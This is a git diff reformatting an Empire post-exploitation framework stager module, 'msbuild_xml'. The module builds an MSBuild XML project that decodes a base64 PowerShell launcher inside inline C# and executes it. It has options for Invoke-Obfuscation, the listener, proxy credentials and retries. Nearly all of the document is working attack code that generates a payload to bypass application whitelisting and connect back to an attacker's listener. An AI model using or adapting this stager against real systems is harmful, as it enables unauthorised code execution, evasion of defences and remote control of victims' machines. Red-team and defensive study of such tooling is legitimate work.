@@ -1,77 +1,73 @@
 from __future__ import print_function
+
 from builtins import object
+
 from empire.server.common import helpers
 
 
 class Stager(object):
-
     def __init__(self, mainMenu, params=[]):
 
         self.info = {
-            'Name': 'msbuild_xml',
-
-            'Author': ['@p3nt4'],
-
-            'Description': 'Generates an XML file to be run with MSBuild.exe',
-
-            'Comments': [
-                'On the endpoint simply launch MSBuild.exe payload.xml'
-            ]
+            "Name": "msbuild_xml",
+            "Author": ["@p3nt4"],
+            "Description": "Generates an XML file to be run with MSBuild.exe",
+            "Comments": ["On the endpoint simply launch MSBuild.exe payload.xml"],
         }
 
         # any options needed by the stager, settable during runtime
         self.options = {
             # format:
             #   value_name : {description, required, default_value}
-            'Listener': {
-                'Description': 'Listener to generate stager for.',
-                'Required': True,
-                'Value': ''
+            "Listener": {
+                "Description": "Listener to generate stager for.",
+                "Required": True,
+                "Value": "",
             },
-            'Language': {
-                'Description': 'Language of the stager to generate.',
-                'Required': True,
-                'Value': 'powershell',
-                'SuggestedValues': ['powershell'],
-                'Strict': True
+            "Language": {
+                "Description": "Language of the stager to generate.",
+                "Required": True,
+                "Value": "powershell",
+                "SuggestedValues": ["powershell"],
+                "Strict": True,
             },
-            'StagerRetries': {
-                'Description': 'Times for the stager to retry connecting.',
-                'Required': False,
-                'Value': '0'
+            "StagerRetries": {
+                "Description": "Times for the stager to retry connecting.",
+                "Required": False,
+                "Value": "0",
             },
-            'Obfuscate': {
-                'Description': 'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
-                'Required': False,
-                'Value': 'False',
-                'SuggestedValues': ['True', 'False'],
-                'Strict': True
+            "Obfuscate": {
+                "Description": "Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.",
+                "Required": False,
+                "Value": "False",
+                "SuggestedValues": ["True", "False"],
+                "Strict": True,
             },
-            'ObfuscateCommand': {
-                'Description': 'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
-                'Required': False,
-                'Value': r'Token\All\1'
+            "ObfuscateCommand": {
+                "Description": "The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.",
+                "Required": False,
+                "Value": r"Token\All\1",
             },
-            'OutFile': {
-                'Description': 'Filename that should be used for the generated output, otherwise returned as a string.',
-                'Required': False,
-                'Value': 'launcher.xml'
+            "OutFile": {
+                "Description": "Filename that should be used for the generated output, otherwise returned as a string.",
+                "Required": False,
+                "Value": "launcher.xml",
             },
-            'UserAgent': {
-                'Description': 'User-agent string to use for the staging request (default, none, or other).',
-                'Required': False,
-                'Value': 'default'
+            "UserAgent": {
+                "Description": "User-agent string to use for the staging request (default, none, or other).",
+                "Required": False,
+                "Value": "default",
             },
-            'Proxy': {
-                'Description': 'Proxy to use for request (default, none, or other).',
-                'Required': False,
-                'Value': 'default'
+            "Proxy": {
+                "Description": "Proxy to use for request (default, none, or other).",
+                "Required": False,
+                "Value": "default",
             },
-            'ProxyCreds': {
-                'Description': 'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
-                'Required': False,
-                'Value': 'default'
-            }
+            "ProxyCreds": {
+                "Description": "Proxy credentials ([domain\]username:password) to use for request (default, none, or other).",
+                "Required": False,
+                "Value": "default",
+            },
         }
 
         # save off a copy of the mainMenu object to access external functionality
@@ -82,19 +78,19 @@ class Stager(object):
             # parameter format is [Name, Value]
             option, value = param
             if option in self.options:
-                self.options[option]['Value'] = value
+                self.options[option]["Value"] = value
 
     def generate(self):
 
         # extract all of our options
-        language = self.options['Language']['Value']
-        listener_name = self.options['Listener']['Value']
-        obfuscate = self.options['Obfuscate']['Value']
-        obfuscate_command = self.options['ObfuscateCommand']['Value']
-        user_agent = self.options['UserAgent']['Value']
-        proxy = self.options['Proxy']['Value']
-        proxy_creds = self.options['ProxyCreds']['Value']
-        stager_retries = self.options['StagerRetries']['Value']
+        language = self.options["Language"]["Value"]
+        listener_name = self.options["Listener"]["Value"]
+        obfuscate = self.options["Obfuscate"]["Value"]
+        obfuscate_command = self.options["ObfuscateCommand"]["Value"]
+        user_agent = self.options["UserAgent"]["Value"]
+        proxy = self.options["Proxy"]["Value"]
+        proxy_creds = self.options["ProxyCreds"]["Value"]
+        stager_retries = self.options["StagerRetries"]["Value"]
 
         encode = True
 
@@ -104,9 +100,16 @@ class Stager(object):
 
         # generate the launcher code
         launcher = self.mainMenu.stagers.generate_launcher(
-            listenerName=listener_name, language=language, encode=encode, obfuscate=obfuscate_script,
-            obfuscationCommand=obfuscate_command, userAgent=user_agent, proxy=proxy, proxyCreds=proxy_creds,
-            stagerRetries=stager_retries)
+            listenerName=listener_name,
+            language=language,
+            encode=encode,
+            obfuscate=obfuscate_script,
+            obfuscationCommand=obfuscate_command,
+            userAgent=user_agent,
+            proxy=proxy,
+            proxyCreds=proxy_creds,
+            stagerRetries=stager_retries,
+        )
 
         launcher_array = launcher.split()
         if len(launcher_array) > 1:
@@ -117,21 +120,21 @@ class Stager(object):
             print(helpers.color("[!] Error in launcher command generation."))
             return ""
         else:
-            code = "<Project ToolsVersion=\"4.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\">"
-            code += "<Target Name=\"EmpireStager\">"
+            code = '<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">'
+            code += '<Target Name="EmpireStager">'
             code += "<ClassExample />"
             code += "</Target>"
             code += "<UsingTask "
-            code += "TaskName=\"ClassExample\" "
-            code += "TaskFactory=\"CodeTaskFactory\" "
-            code += "AssemblyFile=\"C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll\" >"
+            code += 'TaskName="ClassExample" '
+            code += 'TaskFactory="CodeTaskFactory" '
+            code += 'AssemblyFile="C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll" >'
             code += "<Task>"
-            code += "<Reference Include=\"System.Management.Automation\" />"
-            code += "<Using Namespace=\"System\" />"
-            code += "<Using Namespace=\"System.IO\" />"
-            code += "<Using Namespace=\"System.Reflection\" />"
-            code += "<Using Namespace=\"System.Collections.Generic\" />"
-            code += "<Code Type=\"Class\" Language=\"cs\">"
+            code += '<Reference Include="System.Management.Automation" />'
+            code += '<Using Namespace="System" />'
+            code += '<Using Namespace="System.IO" />'
+            code += '<Using Namespace="System.Reflection" />'
+            code += '<Using Namespace="System.Collections.Generic" />'
+            code += '<Code Type="Class" Language="cs">'
             code += "<![CDATA[ "
             code += "using System;"
             code += "using System.IO;"
@@ -148,7 +151,11 @@ class Stager(object):
             code += "{"
             code += "public override bool Execute()"
             code += "{"
-            code += "byte[] data = Convert.FromBase64String(\"" + launcher + "\");string script = Encoding.Unicode.GetString(data);"
+            code += (
+                'byte[] data = Convert.FromBase64String("'
+                + launcher
+                + '");string script = Encoding.Unicode.GetString(data);'
+            )
             code += "PSExecute(script);"
             code += "return true;"
             code += "}"
